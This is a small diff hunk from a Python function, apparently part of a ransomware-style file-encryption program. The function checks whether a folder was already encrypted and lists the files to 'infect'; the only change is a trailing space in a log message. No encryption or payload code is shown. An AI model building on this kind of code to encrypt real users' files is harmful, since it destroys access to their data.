@@ -48,7 +48,7 @@ def ft_client_part(need_print):
         logging(e, need_print)
         os._exit(os.EX_OK)
     if ".not_encoded.ft" in os.listdir():
-        logging("folder already was encripted", need_print)
+        logging("folder already was encripted ", need_print)
         os._exit(os.EX_OK)
     will_infect = list (filter(os.path.isfile, os.listdir(".")))
     notEncoded = ["not_encoded.ft",]
